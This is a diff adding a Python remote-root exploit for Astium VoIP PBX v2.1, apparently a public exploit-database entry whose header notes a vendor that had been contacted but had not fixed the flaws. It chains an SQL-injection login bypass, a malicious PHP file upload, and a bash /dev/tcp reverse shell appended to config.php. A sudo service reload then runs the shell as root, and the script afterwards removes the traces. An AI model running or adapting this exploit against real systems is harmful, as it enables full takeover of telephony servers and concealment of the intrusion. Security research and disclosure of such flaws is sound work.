@@ -1,0 +1,164 @@
+#!/usr/bin/python
+#+--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title     : Astium VoIP PBX <= v2.1 build 25399 Multiple Vulns Remote Root Exploit
+# Date              : 01-02-2012
+# Author            : xistence (xistence<[AT]>0x90.nl)
+# Software link     : http://www.oneip.nl/telefonie-oplossingen/ip-telefooncentrale/astium-downloaden-en-installeren/?lang=en
+# Vendor site       : http://www.oneip.nl/
+# Version           : v2.1 build 25399
+# Tested on         : CentOS 5.x 32-bit
+#
+
+# Vulnerability     : Astium is prone to multiple vulnerabilities. This exploit will use SQL injection to bypass authentication on the
+# login page and get access as an administrator. After that it will upload and execute a PHP script which will modify the
+# "/usr/local/astium/web/php/config.php" script with our reverse shell php code and run a 
+# "sudo /sbin/service astcfgd reload" (Apache user is allowed to restart this service through sudo).
+# The service reload will cause the added code in "/usr/local/astium/web/php/config.php" to be executed as root and thus resulting in
+# a reverse shell with root privileges.
+# Code in "/usr/local/astium/web/php/config.php" is also removed again, else the web interface will stop functioning!
+#
+# Vendor has been contacted several times since 8-22-2011(!) and promised to fix the issue, but until now hasn't resolved the issue.
+#
+#+--------------------------------------------------------------------------------------------------------------------------------+
+
+import urllib, urllib2, cookielib
+import sys
+import random
+import mimetools
+import mimetypes
+from cStringIO import StringIO
+import itertools
+
+print "[*] Astium VoIP PBX <= v2.1 build 25399 Multiple Vulns Remote Root Exploit - xistence - xistence[at]0x90[.]nl - 2013-01-02"
+if (len(sys.argv) != 4):
+    print "[*] Usage: " + sys.argv[0] + " <RHOST> <LHOST> <LPORT>"
+    exit(0)
+ 
+rhost = sys.argv[1]
+lhost = sys.argv[2]
+lport = sys.argv[3]
+
+class MultiPartForm(object):
+    """Accumulate the data to be used when posting a form."""
+
+    def __init__(self):
+        self.form_fields = []
+        self.files = []
+        self.boundary = mimetools.choose_boundary()
+        return
+    
+    def get_content_type(self):
+        return 'multipart/form-data; boundary=%s' % self.boundary
+
+    def add_field(self, name, value):
+        """Add a simple field to the form data."""
+        self.form_fields.append((name, value))
+        return
+
+    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
+        """Add a file to be uploaded."""
+        body = fileHandle.read()
+        if mimetype is None:
+            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
+        self.files.append((fieldname, filename, mimetype, body))
+        return
+    
+    def __str__(self):
+        """Return a string representing the form data, including attached files."""
+        # Build a list of lists, each containing "lines" of the
+        # request.  Each part is separated by a boundary string.
+        # Once the list is built, return a string where each
+        # line is separated by '\r\n'.  
+        parts = []
+        part_boundary = '--' + self.boundary
+        
+        # Add the form fields
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: form-data; name="%s"' % name,
+              '',
+              value,
+            ]
+            for name, value in self.form_fields
+            )
+        
+        # Add the files to upload
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: file; name="%s"; filename="%s"' % \
+                 (field_name, filename),
+              'Content-Type: %s' % content_type,
+              '',
+              body,
+            ]
+            for field_name, filename, content_type, body in self.files
+            )
+        
+        # Flatten the list and add closing boundary marker,
+        # then return CR+LF separated data
+        flattened = list(itertools.chain(*parts))
+        flattened.append('--' + self.boundary + '--')
+        flattened.append('')
+        return '\r\n'.join(flattened)
+
+
+# PHP script to write our reverse shell to the /usr/local/astium/web/php/config.php script.
+phpScript='''<?php
+$f = fopen("/usr/local/astium/web/php/config.php", "a");
+fwrite($f, "\\n<?php system('/bin/bash -i >& /dev/tcp/%s/%s 0>&1'); ?>"); 
+fclose($f);
+system("sudo /sbin/service astcfgd reload");
+// Sleep 1 minute, so that we have enough time for the reload to trigger our reverse shell
+sleep(60);
+$lines = file('/usr/local/astium/web/php/config.php');
+// Delete last 2 lines (containing our reverse shell) of the config.php file, else the web interface won't work anymore after our exploit.
+array_pop($lines);
+array_pop($lines);
+$file = join('', $lines);
+$file_handle = fopen('/usr/local/astium/web/php/config.php', 'w');
+fputs($file_handle, $file);
+fclose($file_handle);
+?>''' % (lhost, lport)
+
+# Create a random file with 8 characters
+filename = ''
+for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',8):
+    filename+=i
+filename +=".php"
+
+# Create the form with simple fields
+form = MultiPartForm()
+form.add_field('__act', 'submit')
+  
+# Add a "fake" file, our simple PHP script.
+form.add_file('importcompany', filename, fileHandle=StringIO(phpScript))
+
+# SQL Injection to bypass login
+SQLiAuthBypass = "system' OR 1='1"
+
+# Our Cookie Jar 
+cj = cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+
+print "[*] Opening index.php to get Cookies"
+# Just open the url to grab the cookies and put them in the jar
+resp = opener.open("http://%s/en/content/index.php" %rhost)
+
+print "[*] Sending evil SQLi authentication bypass payload"
+# Set our post parameters and bypass the logon.php with our SQL Injection
+post_params = urllib.urlencode({'__act' : 'submit', 'user_name' : SQLiAuthBypass, 'pass_word' : 'pwned', 'submit' : 'Login'})
+resp = opener.open("http://%s/en/logon.php" %rhost, post_params)
+
+print "[*] Uploading PHP script " + filename + " to inject PHP code in '/usr/local/astium/web/php/config.php' and run a 'sudo /sbin/service astcfgd reload' to create a reverse shell"
+# Create our multi-part body + headers file upload request
+resp = urllib2.Request("http://%s/en/database/import.php" % rhost)
+body = str(form)
+resp.add_header('Content-type', form.get_content_type())
+resp.add_header('Content-length', len(body))
+resp.add_data(body)
+request = opener.open(resp).read()
+
+print "[*] Executing remote PHP script. Check your netcat shell. NOTE: this can take up to 1-2 minutes before it spawns a shell\n"
+# Simple GET request to execute the script on the remote server
+resp = opener.open("http://%s/upload/%s" % (rhost, filename))
+
